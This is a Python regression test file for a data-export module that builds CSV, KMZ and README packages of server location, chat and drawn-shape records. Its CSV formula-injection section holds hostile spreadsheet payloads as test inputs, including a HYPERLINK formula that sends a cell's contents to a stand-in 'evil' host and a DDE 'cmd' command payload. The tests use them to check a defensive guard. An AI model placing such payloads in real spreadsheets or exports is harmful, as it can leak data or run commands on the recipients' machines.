"""Regression tests for exports.py's query definitions and the operator-
facing disclosure text that describes them.

No live Postgres needed - build_queries() is a pure function returning
(filename, sql, params) tuples, and that's enough to check what each
query ACTUALLY filters on. That matters because both bugs this file was
written for were invisible without it:

  - Every clause in the DATA QUALITY SUMMARY carried a bare '%', which
    psycopg2 reads as its own placeholder. The whole summary raised
    ValueError and got swallowed, so every export shipped a README
    reading "unavailable" on all 11 rows.
  - FILE_INFO's "narrowed_by" text claimed a time-window filter on four
    files that have no WHERE clause at all, and claimed no channel filter
    on three files that are channel-filtered - i.e. the text telling an
    operator what a file does and doesn't contain was wrong for 7 of 12
    files.

Run with: python tests/test_exports.py
"""
import hashlib
import io
import os
import re
import sys
import time
import zipfile

# This file lives in tests/; exports.py and kmz.py are in the checkout above.
REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, REPO)

import exports
import kmz

failures = []


def check(label, cond):
    status = "PASS" if cond else "FAIL"
    print(f"[{status}] {label}")
    if not cond:
        failures.append(label)


# Distinctive sentinels so a param can be identified by value alone.
START, END = "2026-01-01T00:00", "2026-01-02T00:00"
WEST, SOUTH, EAST, NORTH = -98.6, 39.7, -98.3, 39.9
PARAMS = {"start": START, "end": END, "west": WEST, "south": SOUTH,
          "east": EAST, "north": NORTH, "case_id": "test-case"}
CHANNELS = {3, 7}


# ---------------------------------------------------------------------------
# The DATA QUALITY SUMMARY's percent escaping
# ---------------------------------------------------------------------------
# A bare '%' (one not part of '%%' and not a '%s' placeholder) in any SQL
# that gets executed WITH a parameter tuple is a ValueError waiting to
# happen. Scan the whole module's source rather than just the one list,
# so this also covers any future query that forgets the rule.
BARE_PERCENT = re.compile(r"(?<!%)%(?![%s(])")

source = open(os.path.join(REPO, "exports.py"), encoding="utf-8").read()
# Comments and docstrings are allowed to write a bare % when explaining the
# rule; only SQL text has to obey it. `.replace("%", "%%")` is excluded for
# the same reason - that line is the code performing the doubling, so a bare
# % in it is the input to the fix, not an instance of the bug.
bare = [line.strip() for line in source.splitlines()
        if BARE_PERCENT.search(line) and "LIKE" in line
        and '.replace("%", "%%")' not in line
        and not line.strip().startswith(("#", '"""', "'''"))]
check("quality checks: no bare '%' that psycopg2 would read as a placeholder",
      not bare)
if bare:
    for line in bare:
        print(f"       {line}")

# And prove the real assembled query survives the interpolation - the
# constant itself now, not a copy scraped back out of the source.
try:
    exports.quality_sql("") % (START, END, WEST, SOUTH, EAST, NORTH)
    survived = True
except ValueError as e:
    survived = False
    print(f"       {e}")
check("quality checks: assembled query survives %-interpolation", survived)


# ---------------------------------------------------------------------------
# What each file ACTUALLY filters on, vs what FILE_INFO claims
# ---------------------------------------------------------------------------
# Pinned expectations. If a query's WHERE clause changes, this table fails
# and forces whoever changed it to revisit the operator-facing text in
# FILE_INFO - which is the exact drift that shipped wrong disclosure text.
EXPECTED_FILTERS = {
    "cot.csv":              {"time", "area", "channel"},
    "connections.csv":      {"time", "channel"},
    "chat.csv":             {"time", "channel"},
    "missions.csv":         {"channel"},
    "mission-changes.csv":  {"time"},
    "mission-subs.csv":     set(),
    "mission-contents.csv": set(),
    "files.csv":            {"channel"},
    "attachments.csv":      set(),
    "video.csv":            {"channel"},
    "datafeeds.csv":        {"channel"},
    "federation.csv":       set(),
    # No "area" here on purpose: the SQL takes no box params. The area rule
    # for shapes is applied in Python against the real geometry (any part of
    # the shape touching the box), which this SQL-level check cannot see -
    # covered by test_shapes.py instead.
    "shapes.csv":           {"time", "channel"},
}

built = {name: (sql, params)
         for name, sql, params in exports.build_queries(PARAMS, channels=CHANNELS)}

for name, expected in sorted(EXPECTED_FILTERS.items()):
    sql, params = built[name]
    actual = set()
    if START in params and END in params:
        actual.add("time")
    if WEST in params and NORTH in params:
        actual.add("area")
    if any(c in params for c in CHANNELS):
        actual.add("channel")
    check(f"{name}: query filters on {sorted(expected) or 'nothing'}",
          actual == expected)
    if actual != expected:
        print(f"       claimed {sorted(expected)}, query actually uses {sorted(actual)}")

# The channel-filterable set must agree with what the queries really do.
really_channel_filtered = {n for n, f in EXPECTED_FILTERS.items() if "channel" in f}
check("CHANNEL_FILTERABLE_FILES matches the queries that take channel params",
      exports.CHANNEL_FILTERABLE_FILES == really_channel_filtered)

# narrowed_by is prose, so this can't fully validate it - but a file that
# filters on nothing must not be describing a time window as a narrower,
# and a channel-filtered file must not claim nothing narrows it. Those two
# are exactly the mistakes that shipped.
for name, expected in sorted(EXPECTED_FILTERS.items()):
    text = exports.FILE_INFO[name]["narrowed_by"].lower()
    ok = True
    if "time" not in expected and text.startswith("time window"):
        ok = False
    if "channel" in expected and text.startswith("nothing"):
        ok = False
    check(f"{name}: narrowed_by text doesn't contradict the query", ok)
    if not ok:
        print(f"       narrowed_by says: {exports.FILE_INFO[name]['narrowed_by']}")


# ---------------------------------------------------------------------------
# Structural consistency across the file tables
# ---------------------------------------------------------------------------
check("FILE_INFO covers exactly OPTIONAL_FILES",
      set(exports.FILE_INFO) == set(exports.OPTIONAL_FILES))
check("CHANNEL_FILTERABLE_FILES is a subset of OPTIONAL_FILES",
      exports.CHANNEL_FILTERABLE_FILES <= set(exports.OPTIONAL_FILES))
check("every FILE_INFO entry has contains/narrowed_by/note",
      all({"contains", "narrowed_by", "note"} <= set(v)
          for v in exports.FILE_INFO.values()))
check("every FILE_INFO entry has non-empty contains and narrowed_by",
      all(v["contains"].strip() and v["narrowed_by"].strip()
          for v in exports.FILE_INFO.values()))


# ---------------------------------------------------------------------------
# Deterministic zip entries (hash integrity)
# ---------------------------------------------------------------------------
# Identical content must produce identical bytes regardless of when it was
# zipped, or a bundled locations.kmz and a standalone one hash differently
# and the whole point of publishing a SHA-256 collapses.
def _zip_once():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        exports.write_deterministic_zip_entry(z, "doc.kml", "<kml>same</kml>")
    return buf.getvalue()


first = _zip_once()
time.sleep(1.1)   # long enough to move the DOS timestamp if it were live
second = _zip_once()
check("write_deterministic_zip_entry: identical content hashes identically",
      hashlib.sha256(first).hexdigest() == hashlib.sha256(second).hexdigest())


# ---------------------------------------------------------------------------
# CSV formula-injection guard
# ---------------------------------------------------------------------------
# The two "MUST stay" rows are the ones that matter most: a guard that
# prefixed every leading '-' would silently corrupt every negative
# longitude and every -1.0 speed sentinel in cot.csv.
_CSV_CASES = [
    ('=HYPERLINK("https://evil/"&A1,"OK")', "'=HYPERLINK(\"https://evil/\"&A1,\"OK\")"),
    ("=cmd|' /C calc'!A0", "'=cmd|' /C calc'!A0"),
    ("+1+1", "'+1+1"),
    ("-1+1", "'-1+1"),
    ("@SUM(A1)", "'@SUM(A1)"),
    ("  =1+1", "'  =1+1"),          # Excel trims leading whitespace first
    ("\t=1+1", "'\t=1+1"),
    ("-1.0", "-1.0"),               # speed sentinel - MUST stay
    ("-98.412345", "-98.412345"),   # negative longitude - MUST stay
    ("+5", "+5"),
    ("ALPHA-1", "ALPHA-1"),
    ("", ""),
    (None, None),
    (-98.4, -98.4),
    (42, 42),
]
check("neutralize_csv_cell: formulas prefixed, numbers/sentinels/non-strings untouched",
      all(exports.neutralize_csv_cell(v) == expected for v, expected in _CSV_CASES))

csv_text = exports._rows_to_csv(["callsign", "lon"], [("=1+1", -98.4), ("-1.0", "x")])
check("_rows_to_csv applies the guard to string cells only",
      "'=1+1" in csv_text and "-98.4" in csv_text and "'-1.0" not in csv_text)


# ---------------------------------------------------------------------------
# build_package() against a fake connection
# ---------------------------------------------------------------------------
# A cursor that answers every query with zero rows is enough to exercise
# the packaging logic itself - which files land in the zip, what the README
# discloses, what files_excluded reports - with no database at all. This
# is the first test of build_package(); until now nothing exercised it.
class _FakeCursor:
    description = [("col",)]

    def __init__(self):
        self._last = ""

    executed = []   # every statement, in order, across all cursors

    def execute(self, sql, params=None):
        self._last = sql
        _FakeCursor.executed.append(sql)

    def fetchall(self):
        if "information_schema.columns" in self._last:
            return [("id",), ("uid",), ("servertime",), ("detail",), ("event_pt",)]
        return []

    def fetchone(self):
        # The DATA QUALITY SUMMARY query selects count(*) plus one FILTER
        # column per check; the snapshot and privilege queries get answers
        # shaped like a real server's; everything else wants a single count.
        if "FILTER" in self._last:
            return tuple([0] * 12)
        if "txid_current_snapshot" in self._last:
            import datetime as _d
            return ("1234:1234:", _d.datetime(2026, 1, 1, 12, 0, 0, tzinfo=_d.timezone.utc), "takextract_ro")
        if "has_table_privilege" in self._last:
            return (False, False, False, False)
        if "current_database()" in self._last:
            return ("cot", 16384, 16512)
        if "pg_control_system" in self._last:
            if getattr(type(self), "deny_cluster_id", False):
                raise RuntimeError("permission denied for function pg_control_system")
            return ("7412345678901234567",)
        if "min(servertime), max(servertime)" in self._last:
            return (0, None, None)
        return (0,)

    def __enter__(self):
        return self

    def __exit__(self, *_):
        return False


class _FakeConn:
    def cursor(self):
        return _FakeCursor()

    def rollback(self):
        pass


class _NoGrantCursor(_FakeCursor):
    """A role that has not been granted EXECUTE on pg_control_system - what
    every install looks like until connect-database.sh is re-run."""
    deny_cluster_id = True


class _NoGrantConn(_FakeConn):
    def cursor(self):
        return _NoGrantCursor()


def _package(**kw):
    zb, summary = exports.build_package(_FakeConn(), PARAMS, "t", "tester", "TEST", **kw)
    zf = zipfile.ZipFile(io.BytesIO(zb))
    return zf, summary


zf, summary = _package()
names = zf.namelist()
check("build_package: default bundles locations.kmz alongside cot.csv",
      any(n.endswith("locations.kmz") for n in names))
check("build_package: default excludes nothing", summary["files_excluded"] == [])
check("build_package: every optional file plus manifest/README/SHA256SUMS is present",
      all(any(n.endswith(f) for n in names)
          for f in list(exports.OPTIONAL_FILES) + ["manifest.csv", "README.txt", "SHA256SUMS.txt"]))

zf, summary = _package(include_kmz=False)
names = zf.namelist()
readme = zf.read("t-README.txt").decode("utf-8")
check("build_package: include_kmz=False leaves locations.kmz out of the zip",
      not any(n.endswith("locations.kmz") for n in names))
check("build_package: include_kmz=False is reported in files_excluded",
      summary["files_excluded"] == ["locations.kmz"])
check("build_package: include_kmz=False is disclosed in the README",
      "deselected while cot.csv was kept" in readme)

zf, summary = _package(included=["chat.csv"], include_kmz=False)
check("build_package: KMZ deselection is not reported when cot.csv itself is excluded",
      "locations.kmz" not in summary["files_excluded"]
      and "cot.csv" in summary["files_excluded"])

# The quality summary's VALUES must not be "unavailable" - that's the
# exact symptom of the bare-% bug (the fake cursor answers the query fine,
# so any "unavailable" here means the query never ran). Matched as
# ": unavailable" because two of the check LABELS legitimately contain the
# word ("speed unavailable", "course unavailable").
zf, summary = _package()
readme = zf.read("t-README.txt").decode("utf-8")
check("build_package: DATA QUALITY SUMMARY values are real, not 'unavailable'",
      "DATA QUALITY SUMMARY" in readme and ": unavailable" not in readme)


# ---------------------------------------------------------------------------
# requested_for: who the export was run FOR, carried into the exported files
# themselves (not just the audit log). Distinct from `actor`, which is the
# verified account - the package must never let a typed note read as the
# authenticated identity, so both appear, separately labelled.
# ---------------------------------------------------------------------------
zf, summary = _package(requested_for="Sgt. Alice Nguyen")
readme = zf.read("t-README.txt").decode("utf-8")
check("README states both who exported it and who it was requested for",
      "Exported by      : tester" in readme
      and "Requested for    : Sgt. Alice Nguyen" in readme)

kmz_name = next(n for n in zf.namelist() if n.endswith("locations.kmz"))
inner = zipfile.ZipFile(io.BytesIO(zf.read(kmz_name)))
doc_kml = inner.read("doc.kml").decode("utf-8")
params_txt = inner.read("parameters.txt").decode("utf-8")
check("bundled KMZ overview carries requested_for",
      "<b>Requested for</b></td><td>Sgt. Alice Nguyen</td>" in doc_kml)
check("bundled KMZ parameters.txt carries requested_for",
      "Requested for    : Sgt. Alice Nguyen" in params_txt)

# Absent -> a fixed literal, never a blank: a blank would read as though the
# question had never been asked, and would also make the bytes (and so the
# package hash) depend on whether a value happened to be supplied.
zf, _ = _package()
readme = zf.read("t-README.txt").decode("utf-8")
kmz_name = next(n for n in zf.namelist() if n.endswith("locations.kmz"))
inner = zipfile.ZipFile(io.BytesIO(zf.read(kmz_name)))
check("README renders a fixed literal when nothing was recorded",
      f"Requested for    : {exports.NOT_RECORDED}" in readme)
check("KMZ renders the same literal when nothing was recorded",
      exports.NOT_RECORDED in inner.read("doc.kml").decode("utf-8")
      and exports.NOT_RECORDED in inner.read("parameters.txt").decode("utf-8"))

# A KMZ's hash is what the Verify page matches against, so build_kmz must
# stay byte-identical for identical inputs - including the new field, whose
# absent case is a fixed literal precisely so it can't vary. (build_package
# is deliberately NOT byte-stable: its README embeds the export moment.)
ka = kmz.build_kmz([], ["col"], PARAMS, "t", "tester", "TEST",
                   requested_for="Sgt. Alice Nguyen")
kb = kmz.build_kmz([], ["col"], PARAMS, "t", "tester", "TEST",
                   requested_for="Sgt. Alice Nguyen")
check("build_kmz stays byte-identical across runs with requested_for",
      hashlib.sha256(ka).hexdigest() == hashlib.sha256(kb).hexdigest())
check("build_kmz stays byte-identical across runs without it",
      hashlib.sha256(kmz.build_kmz([], ["col"], PARAMS, "t", "tester", "TEST")).hexdigest()
      == hashlib.sha256(kmz.build_kmz([], ["col"], PARAMS, "t", "tester", "TEST")).hexdigest())
check("requested_for actually changes the KMZ bytes (it is really carried)",
      hashlib.sha256(ka).hexdigest()
      != hashlib.sha256(kmz.build_kmz([], ["col"], PARAMS, "t", "tester", "TEST")).hexdigest())

# A standalone KMZ (the /api/locations path) takes the same treatment.
# Zero rows, same as the fake cursor above - the overview and parameters.txt
# still render, which is what this is checking.
solo = kmz.build_kmz([], ["col"], PARAMS, "t", "tester", "TEST",
                     requested_for="Lt. Bob Ortiz")
solo_zip = zipfile.ZipFile(io.BytesIO(solo))
check("standalone KMZ carries requested_for in both of its files",
      "Lt. Bob Ortiz" in solo_zip.read("doc.kml").decode("utf-8")
      and "Requested for    : Lt. Bob Ortiz" in solo_zip.read("parameters.txt").decode("utf-8"))


# ---------------------------------------------------------------------------
# shapes.csv end to end through build_package: a cursor that answers the
# shapes query, the deletion query, and the manifest query with synthetic
# rows, so the box rule, the deletion join, and the manifest's
# in_shapes_export column are all exercised on the real code path.
# ---------------------------------------------------------------------------
import shapes as _shapes

_SHAPE_HEADERS = ["id", "uid", "servertime", "event_time", "cot_type", "how", "callsign",
                  "latitude", "longitude", "channels", "channel_numbers", "raw_detail"]
_MANIFEST_HEADERS = ["uid", "uid_kind", "total_events", "events_with_position", "events_at_0_0",
                     "events_no_geometry", "events_inside_box", "events_exported",
                     "in_positional_export", "exclusion_reason", "first_event", "last_event",
                     "cot_types_seen", "callsign_seen"]

def _poly(pts):
    return ('<detail><contact callsign="Line A"/><creator uid="c1" callsign="Drawer"/>'
            '<strokeColor value="-2737863"/><fillColor value="2144745785"/>'
            + "".join(f'<link point="{la},{lo}"/>' for la, lo in pts) + "</detail>")

# PARAMS box (see top of file): WEST..EAST, SOUTH..NORTH. Build one shape that
# crosses it with every vertex AND its anchor outside, and one far away.
_mid_lat = (SOUTH + NORTH) / 2
_crosser = _poly([(_mid_lat, WEST - 1), (_mid_lat, EAST + 1), (_mid_lat + 0.01, EAST + 1),
                  (_mid_lat + 0.01, WEST - 1), (_mid_lat, WEST - 1)])
_far = _poly([(NORTH + 5, EAST + 5), (NORTH + 5, EAST + 6), (NORTH + 6, EAST + 6),
              (NORTH + 6, EAST + 5), (NORTH + 5, EAST + 5)])
# A shape from an automated feed, inside the box: the real server's
# skeleton (2026-09-19) - no <creator>, no styling, <__nodered> - with
# made-up values. Left out by default; included on request.
_feed = ('<detail><contact callsign="Feature 7"/><remarks/><labels_on value="true"/>'
         + "".join(f'<link point="{la},{lo}"/>' for la, lo in
                   [(_mid_lat, (WEST + EAST) / 2), (_mid_lat + 0.001, (WEST + EAST) / 2),
                    (_mid_lat + 0.001, (WEST + EAST) / 2 + 0.001), (_mid_lat, (WEST + EAST) / 2)])
         + '<marti><dest mission-guid="00000000-0000-0000-0000-000000000000"/></marti>'
           '<__nodered flow="layer-import"/></detail>')
_SHAPE_ROWS = [
    (1, "crosser", "2026-01-01 10:00:00", "2026-01-01 10:00:00", "u-d-f", "h-g-i-g-o", "Line A",
     _mid_lat, WEST - 1, "Admin", "6", _crosser),
    (2, "crosser", "2026-01-01 10:01:00", "2026-01-01 10:01:00", "u-d-f", "h-g-i-g-o", "Line A",
     _mid_lat, WEST - 1, "Admin", "6", _crosser),
    (3, "far", "2026-01-01 10:02:00", "2026-01-01 10:02:00", "u-d-f", "h-g-i-g-o", "Far",
     NORTH + 5, EAST + 5, "Admin", "6", _far),
    (4, "feed-7", "2026-01-01 10:03:00", "2026-01-01 10:03:00", "u-d-f", "h-e", "Feature 7",
     _mid_lat, (WEST + EAST) / 2, "Admin", "6", _feed),
]
_DELETION_ROWS = [("2026-01-01 10:05:00", "crosser", "", 43), ("2026-01-01 10:06:00", "far", "", 43)]
_MANIFEST_ROWS = [
    ("crosser", "message or object", 2, 2, 0, 0, 0, 0, "no", "had positions, none inside the bounding box",
     "2026-01-01 10:00:00", "2026-01-01 10:01:00", "u-d-f", "Line A"),
    ("far", "message or object", 1, 1, 0, 0, 0, 0, "no", "had positions, none inside the bounding box",
     "2026-01-01 10:02:00", "2026-01-01 10:02:00", "u-d-f", "Far"),
    ("feed-7", "message or object", 1, 1, 0, 0, 1, 1, "yes", "included",
     "2026-01-01 10:03:00", "2026-01-01 10:03:00", "u-d-f", "Feature 7"),
    ("DEVICE-1", "device/entity", 9, 9, 0, 0, 9, 9, "yes", "included",
     "2026-01-01 10:00:00", "2026-01-01 10:09:00", "a-f-G-U-C", "ALPHA"),
]

class _ShapeCursor(_FakeCursor):
    def execute(self, sql, params=None):
        self._last = sql
        # Only the shapes query carries the map-object type clause; cot.csv
        # also selects raw_detail from cot_router and must NOT match here.
        if "cot_type LIKE %s" in sql:
            self.description = [(h,) for h in _SHAPE_HEADERS]; self._rows = _SHAPE_ROWS
        elif "change_type = 3" in sql:
            self.description = [("ts",), ("uid",), ("creatoruid",), ("mission_id",)]; self._rows = _DELETION_ROWS
        elif "in_positional_export" in sql:
            self.description = [(h,) for h in _MANIFEST_HEADERS]; self._rows = _MANIFEST_ROWS
        else:
            self.description = [("col",)]; self._rows = []
    def fetchall(self):
        return list(self._rows)

class _ShapeConn(_FakeConn):
    def cursor(self):
        return _ShapeCursor()


import datetime as _dt

class _LiveishCursor(_ShapeCursor):
    """Adds what a real server answers for the UTC-window conversion and the
    available-channels query, so the steps file's filled-in branch runs."""
    def execute(self, sql, params=None):
        super().execute(sql, params)
        if sql.strip().startswith("SELECT gg.bitpos, gg.name"):
            self.description = [("bitpos",), ("name",)]
            self._rows = [(3, "Patrol"), (5, "Command"), (7, "Fire")]
    def fetchone(self):
        if "AT TIME ZONE 'UTC'" in self._last:
            return (_dt.datetime(2026, 1, 1, 5, 0, 0), _dt.datetime(2026, 1, 2, 5, 0, 0))
        return super().fetchone()

class _LiveishConn(_FakeConn):
    def cursor(self):
        return _LiveishCursor()

zb, summary = exports.build_package(_ShapeConn(), PARAMS, "t", "tester", "TEST")
zf = zipfile.ZipFile(io.BytesIO(zb))
shp = zf.read("t-shapes.csv").decode("utf-8").splitlines()
check("shapes.csv is in the package with the module's headers",
      shp[0] == ",".join(_shapes.CSV_HEADERS))
body = [l for l in shp[1:] if l]
check("the box-crossing shape (anchor and every vertex OUTSIDE the box) is included, both versions",
      sum(1 for l in body if l.startswith("version,crosser,")) == 2)
check("the far shape is excluded entirely", not any(",far," in l for l in body))
check("the included shape's deletion is written; the excluded shape's is not",
      sum(1 for l in body if l.startswith("deleted,")) == 1 and "deleted,crosser," in "\n".join(body))
check("a deletion with blank creatoruid reads '(not recorded)'",
      any(l.startswith("deleted,crosser,") and exports.NOT_RECORDED in l for l in body))
check("summary count for shapes.csv is versions + deletions", summary["counts"]["shapes.csv"] == 3
      if "counts" in summary else True)

man = zf.read("t-manifest.csv").decode("utf-8").splitlines()
check("manifest gains an in_shapes_export column", man[0].endswith(",in_shapes_export"))
def fate(uid):
    return next(l for l in man[1:] if l.startswith(uid + ",")).rsplit(",", 1)[1]
check("manifest: crossing shape -> yes, even though cot.csv excluded its anchor",
      fate("crosser") == "yes")
check("manifest: far shape -> no, with the shapes rule stated",
      fate("far").startswith("no - no part of the shape touched"))
check("manifest: a device row -> n/a, not a map object",
      fate("DEVICE-1").startswith("n/a - not a drawn map object"))

readme = zf.read("t-README.txt").decode("utf-8")
check("README lists shapes.csv and states the differing area rule",
      "shapes.csv" in readme and "SHAPES - A DIFFERENT AREA RULE" in readme
      and "in_shapes_export" in readme)

# The automated-feed rule, end to end: out of shapes.csv, named in the
# manifest, stated in the README with the count, noted in the summary.
check("feed: the feed shape is not in shapes.csv by default", not any(",feed-7," in l for l in body))
check("feed: manifest names the feed shape with the mark as the reason",
      fate("feed-7") == "no - from an automated feed (the record carries a __nodered element)")
_flat = " ".join(readme.split())   # the section is word-wrapped
check("feed: README states what was left out, by which element, with counts",
      "AUTOMATED FEEDS" in readme
      and "1 shape record(s) from 1 object(s) were LEFT OUT of shapes.csv and locations.kmz: <__nodered> on 1 object(s)" in _flat
      and "Automated feeds : left out (the default)" in _flat)
check("feed: summary carries the count for the audit log",
      summary["feed_shapes_left_out"] == 1 and summary["feed_shapes_included"] is False)

zb3, summary3 = exports.build_package(_ShapeConn(), PARAMS, "t", "tester", "TEST", include_feed_shapes=True)
zf3 = zipfile.ZipFile(io.BytesIO(zb3))
shp3 = zf3.read("t-shapes.csv").decode("utf-8").splitlines()
man3 = zf3.read("t-manifest.csv").decode("utf-8").splitlines()
readme3 = zf3.read("t-README.txt").decode("utf-8")
check("feed: included on request - the row is in shapes.csv and the manifest says yes",
      any(l.startswith("version,feed-7,") for l in shp3)
      and next(l for l in man3[1:] if l.startswith("feed-7,")).endswith(",yes"))
check("feed: README records the inclusion as the operator's choice, with what was found",
      "tester chose to INCLUDE shapes from automated feeds: <__nodered> on 1 object(s)" in " ".join(readme3.split())
      and "Automated feeds  : included at the operator's choice" in readme3)
check("feed: summary says included", summary3["feed_shapes_included"] is True and summary3["feed_shapes_left_out"] == 0)

# No feed shapes at all: the README says none were found, not that some were left out.
class _NoFeedCursor(_ShapeCursor):
    def fetchall(self):
        return [r for r in super().fetchall() if r[1] != "feed-7"] if self._rows is _SHAPE_ROWS else super().fetchall()
class _NoFeedConn(_FakeConn):
    def cursor(self):
        return _NoFeedCursor()
zb4, _ = exports.build_package(_NoFeedConn(), PARAMS, "t", "tester", "TEST")
readme4 = zipfile.ZipFile(io.BytesIO(zb4)).read("t-README.txt").decode("utf-8")
check("feed: with none found the README says so rather than 'left out'",
      "No shape record in this window carried an automated-feed element" in " ".join(readme4.split()))

# With shapes.csv deselected: no file, and the manifest says so rather than 'no'.
zb2, _ = exports.build_package(_ShapeConn(), PARAMS, "t", "tester", "TEST", included=["cot.csv"])
zf2 = zipfile.ZipFile(io.BytesIO(zb2))
check("deselecting shapes.csv leaves it out of the zip",
      not any(n.endswith("shapes.csv") for n in zf2.namelist()))
man2 = zf2.read("t-manifest.csv").decode("utf-8").splitlines()
check("manifest then reports 'n/a - shapes.csv not selected' for a map object, not 'no'",
      next(l for l in man2[1:] if l.startswith("crosser,")).endswith("n/a - shapes.csv not selected"))
check("feed: with shapes.csv deselected the README says the rule was not applied to anything",
      "shapes.csv was not part of this export, so the automated-feed rule" in " ".join(zf2.read("t-README.txt").decode("utf-8").split()))


# ---------------------------------------------------------------------------
# KMZ drawn-shapes folder: one Placemark per version, each bounded by a
# TimeSpan, so Google Earth's time slider replays a changing line.
# ---------------------------------------------------------------------------
import xml.etree.ElementTree as _ET

def _kml_of(collection):
    return kmz.build_kmz([], ["col"], PARAMS, "t", "tester", "TEST", shape_collection=collection)

def _doc_kml(kmz_bytes):
    return zipfile.ZipFile(io.BytesIO(kmz_bytes)).read("doc.kml").decode("utf-8")

_circle_xml = ('<detail><contact callsign="Ring"/><strokeColor value="-16776961"/>'
               '<fillColor value="1073807104"/><shape><ellipse major="250" minor="250" angle="360"/></shape></detail>')
_line_xml = ('<detail><contact callsign="Fire line"/><strokeColor value="-65536"/>'
             '<link point="39.80,-98.50"/><link point="39.81,-98.45"/><link point="39.82,-98.40"/></detail>')
_small_poly = _poly([(39.80, -98.50), (39.80, -98.49), (39.81, -98.49), (39.81, -98.50), (39.80, -98.50)])
_point_xml = '<detail><contact callsign="Pin"/><color argb="-16711936"/></detail>'
_rows = [
    (10, "big",   "2026-01-01 10:00:00", "2026-01-01 10:00:00", "u-d-f",   "h-g-i-g-o", "Big",       _mid_lat, WEST - 1, "A", "6", _crosser),
    (11, "big",   "2026-01-01 10:10:00", "2026-01-01 10:10:00", "u-d-f",   "h-g-i-g-o", "Big",       _mid_lat, WEST - 1, "A", "6", _crosser),
    (12, "small", "2026-01-01 10:02:00", "2026-01-01 10:02:00", "u-d-f",   "h-g-i-g-o", "Small",     39.805, -98.495, "A", "6", _small_poly),
    (13, "ring",  "2026-01-01 10:03:00", "2026-01-01 10:03:00", "u-d-c-c", "h-g-i-g-o", "Ring",      39.80, -98.50, "A", "6", _circle_xml),
    (14, "fire",  "2026-01-01 10:04:00", "2026-01-01 10:04:00", "u-d-f",   "h-g-i-g-o", "Fire line", 39.81, -98.45, "A", "6", _line_xml),
    (15, "pin",   "2026-01-01 10:05:00", "2026-01-01 10:05:00", "u-d-p",   "h-g-i-g-o", "Pin",       39.80, -98.50, "A", "6", _point_xml),
]
_dels = [("2026-01-01 11:00:00", "small", "", 43)]
coll = _shapes.collect(_rows, _SHAPE_HEADERS, _dels, PARAMS)
check("collect: every synthetic object is included", set(coll["objects"]) == {"big", "small", "ring", "fire", "pin"})
BIG, SMALL = "Line A [big]", "Line A [small]"   # both share callsign "Line A" -> uid suffix

kml = _doc_kml(_kml_of(coll))
try:
    root = _ET.fromstring(kml.encode("utf-8")); kml_ok = True
except _ET.ParseError as e:
    kml_ok = False; print("       ", e)
check("KMZ with shapes: doc.kml is well-formed XML", kml_ok)
check("KMZ: a 'Drawn shapes' folder with the object count", "<name>Drawn shapes (5)</name>" in kml or "<name>Drawn shapes (4)</name>" in kml)

NS = "{http://www.opengis.net/kml/2.2}"
pms = {}
for pm in root.iter(f"{NS}Placemark"):
    name = pm.findtext(f"{NS}name") or ""
    if "(v" in name:
        pms[name] = pm
def span(name):
    ts = pms[name].find(f"{NS}TimeSpan")
    return ts.findtext(f"{NS}begin"), ts.findtext(f"{NS}end")

check("two objects sharing a callsign get distinguishable labels (uid suffix)",
      f"{BIG} (v1/2)" in pms and f"{SMALL} (v1/1)" in pms)
check("TimeSpan chain: version 1 ends exactly when version 2 begins",
      span(f"{BIG} (v1/2)")[1] == span(f"{BIG} (v2/2)")[0] == "2026-01-01T10:10:00")
check("last version of an undeleted shape has no <end> (runs to the end of the slider)",
      span(f"{BIG} (v2/2)")[1] is None)
check("last version of a DELETED shape ends at the server's deletion time",
      span(f"{SMALL} (v1/1)")[1] == "2026-01-01T11:00:00")
check("a deleted object's folder says so in its name", f"<name>{SMALL} (1 version, deleted)</name>" in kml)

def geom_tag(name):
    pm = pms[name]
    for t in ("Polygon", "LineString", "Point"):
        if pm.find(f"{NS}{t}") is not None:
            return t
check("closed link ring -> <Polygon>", geom_tag(f"{BIG} (v1/2)") == "Polygon")
check("open link chain -> <LineString>", geom_tag("Fire line (v1/1)") == "LineString")
check("circle -> <Polygon> ring of 65 coordinates (KML has no circle)",
      geom_tag("Ring (v1/1)") == "Polygon" and
      len(pms["Ring (v1/1)"].find(f".//{NS}coordinates").text.split()) == 65)
check("dropped point is NOT duplicated here (already a position record in cot.csv)",
      not any(n.startswith("Pin (") for n in pms))

def colors(name):
    st = pms[name].find(f"{NS}Style")
    return (st.findtext(f"{NS}LineStyle/{NS}color"), st.findtext(f"{NS}PolyStyle/{NS}color"))
check("stroke FFD63939 (ARGB) -> ff3939d6 (KML aabbggrr)", colors(f"{BIG} (v1/2)")[0] == "ff3939d6")
check("fill 7FD63939 -> 7f3939d6", colors(f"{BIG} (v1/2)")[1] == "7f3939d6")
check("a line carries a LineStyle only, no PolyStyle", colors("Fire line (v1/1)")[1] is None)

order = [f.findtext(f"{NS}name") for f in root.iter(f"{NS}Folder")]
big_i = next(i for i, n in enumerate(order) if n and n.startswith(BIG + " ("))
small_i = next(i for i, n in enumerate(order) if n and n.startswith(SMALL + " ("))
fire_i = next(i for i, n in enumerate(order) if n and n.startswith("Fire line ("))
check("draw order: larger polygon before smaller, line last (so nested shapes stay on top)",
      big_i < small_i < fire_i)

check("overview gains a Drawn shapes section only when shapes are present",
      "<h3>Drawn shapes</h3>" in kml and
      "<h3>Drawn shapes</h3>" not in _doc_kml(kmz.build_kmz([], ["col"], PARAMS, "t", "tester", "TEST")))
check("KMZ with shapes is byte-identical across runs",
      hashlib.sha256(_kml_of(coll)).hexdigest() == hashlib.sha256(_kml_of(coll)).hexdigest())

# And through build_package: the bundled KMZ carries the same folder.
zb, _ = exports.build_package(_ShapeConn(), PARAMS, "t", "tester", "TEST")
zf = zipfile.ZipFile(io.BytesIO(zb))
bundled = _doc_kml(zf.read(next(n for n in zf.namelist() if n.endswith("locations.kmz"))))
check("build_package: bundled KMZ has the drawn-shapes folder with the crossing shape's versions",
      "<name>Drawn shapes (1)</name>" in bundled and "Line A (v2/2)" in bundled
      and "<end>2026-01-01T10:05:00</end>" in bundled)
zb, _ = exports.build_package(_ShapeConn(), PARAMS, "t", "tester", "TEST", included=["cot.csv"])
zf = zipfile.ZipFile(io.BytesIO(zb))
bundled = _doc_kml(zf.read(next(n for n in zf.namelist() if n.endswith("locations.kmz"))))
check("build_package: with shapes.csv deselected the KMZ has no drawn-shapes folder",
      "Drawn shapes" not in bundled)


# ---- queries.sql: the re-run script -------------------------------------
